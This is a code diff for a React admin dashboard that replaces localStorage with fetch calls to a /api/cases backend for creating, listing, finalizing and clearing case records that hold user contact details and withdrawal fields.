@@ -29,16 +29,16 @@ interface Case {
   id: string;
   accessCode: string;
   status: 'created' | 'registered' | 'syncing' | 'active' | 'completed';
-  user?: {
-    name: string;
-    email: string;
-    mobile: string;
-  };
-  adminData?: AdminData;
-  submission?: {
-    option: "A" | "B";
-    timestamp: string;
-  };
+  userName?: string;
+  userEmail?: string;
+  userMobile?: string;
+  vipStatus?: string;
+  username?: string;
+  withdrawalAmount?: string;
+  withdrawalBatches?: string;
+  physilocal0?: string;
+  selectedOption?: string;
+  submittedAt?: string;
 }
 
 export default function AdminDashboard() {
@@ -57,9 +57,16 @@ export default function AdminDashboard() {
   
   const { toast } = useToast();
 
-  const loadData = () => {
-    const data = JSON.parse(localStorage.getItem('ibc_cases') || '[]');
-    setCases(data);
+  const loadData = async () => {
+    try {
+      const response = await fetch('/api/cases');
+      if (response.ok) {
+        const data = await response.json();
+        setCases(data);
+      }
+    } catch (error) {
+      console.error('Failed to load cases:', error);
+    }
   };
 
   useEffect(() => {
@@ -69,58 +76,85 @@ export default function AdminDashboard() {
     return () => clearInterval(interval);
   }, []);
 
-  const clearData = () => {
+  const clearData = async () => {
     if(confirm("Clear all simulated records?")) {
-      localStorage.removeItem('ibc_cases');
-      loadData();
+      try {
+        // Delete all cases
+        await Promise.all(cases.map(c => 
+          fetch(`/api/cases/${c.id}`, { method: 'DELETE' })
+        ));
+        loadData();
+        toast({ title: "All cases cleared", description: "Database has been reset." });
+      } catch (error) {
+        toast({ variant: "destructive", title: "Error", description: "Failed to clear cases." });
+      }
     }
   };
 
-  const handleCreateCase = () => {
+  const handleCreateCase = async () => {
     if (!newAccessCode) return;
     
-    const newCase: Case = {
-      id: `CASE-${Math.floor(Math.random() * 100000)}`,
-      accessCode: newAccessCode,
-      status: 'created'
-    };
-    
-    const updatedCases = [newCase, ...cases];
-    localStorage.setItem('ibc_cases', JSON.stringify(updatedCases));
-    setCases(updatedCases);
-    setIsCreateOpen(false);
-    setNewAccessCode("");
-    toast({ title: "Case Created", description: `Access Code: ${newCase.accessCode}` });
+    try {
+      const response = await fetch('/api/cases', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          accessCode: newAccessCode,
+          status: 'created'
+        })
+      });
+
+      if (response.ok) {
+        const newCase = await response.json();
+        setIsCreateOpen(false);
+        setNewAccessCode("");
+        loadData();
+        toast({ title: "Case Created", description: `Access Code: ${newCase.accessCode}` });
+      } else {
+        toast({ variant: "destructive", title: "Error", description: "Failed to create case." });
+      }
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to create case." });
+    }
   };
 
   const openFinalizeModal = (c: Case) => {
     setSelectedCase(c);
     setFinalizeData({
       ...finalizeData,
-      username: c.user?.name || ""
+      username: c.userName || ""
     });
     setIsFinalizeOpen(true);
   };
 
-  const handleFinalize = () => {
+  const handleFinalize = async () => {
     if (!selectedCase) return;
     
-    const updatedCases = cases.map(c => {
-      if (c.id === selectedCase.id) {
-        return {
-          ...c,
-          status: 'active' as const,
-          adminData: finalizeData
-        };
+    try {
+      const response = await fetch(`/api/cases/${selectedCase.id}`, {
+        method: 'PATCH',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          status: 'active',
+          vipStatus: finalizeData.vipStatus,
+          username: finalizeData.username,
+          withdrawalAmount: finalizeData.withdrawalAmount,
+          withdrawalBatches: finalizeData.withdrawalBatches,
+          physilocal0: finalizeData.physilocal0
+        })
+      });
+
+      if (response.ok) {
+        setIsFinalizeOpen(false);
+        setSelectedCase(null);
+        loadData();
+        toast({ title: "Account Activated", description: "User can now access the secure letter." });
+      } else {
+        toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
       }
-      return c;
-    });
-    
-    localStorage.setItem('ibc_cases', JSON.stringify(updatedCases));
-    setCases(updatedCases);
-    setIsFinalizeOpen(false);
-    setSelectedCase(null);
-    toast({ title: "Account Activated", description: "User can now access the secure letter." });
+    } catch (error) {
+      toast({ variant: "destructive", title: "Error", description: "Failed to finalize case." });
+    }
   };
 
   return (
@@ -223,17 +257,17 @@ export default function AdminDashboard() {
                       </TableCell>
                       <TableCell className="font-mono text-white font-bold tracking-wider">{c.accessCode}</TableCell>
                       <TableCell className="text-slate-300">
-                        {c.user ? (
-                           <div className="font-medium text-white">{c.user.name}</div>
+                        {c.userName ? (
+                           <div className="font-medium text-white">{c.userName}</div>
                         ) : (
                           <span className="text-slate-600 italic">Pending Login...</span>
                         )}
                       </TableCell>
                       <TableCell className="text-slate-400 text-sm">
-                        {c.user ? (
+                        {c.userEmail ? (
                           <div className="flex flex-col">
-                            <span>{c.user.email}</span>
-                            <span className="text-xs opacity-70">{c.user.mobile}</span>
+                            <span>{c.userEmail}</span>
+                            <span className="text-xs opacity-70">{c.userMobile}</span>
                           </div>
                         ) : (
                           "-"
@@ -249,8 +283,8 @@ export default function AdminDashboard() {
                             Finalize Sync
                           </Button>
                         )}
-                        {c.status === 'active' && c.submission && (
-                          <Badge variant="secondary">Option {c.submission.option}</Badge>
+                        {c.status === 'completed' && c.selectedOption && (
+                          <Badge variant="secondary">Option {c.selectedOption}</Badge>
                         )}
                       </TableCell>
                     </TableRow>
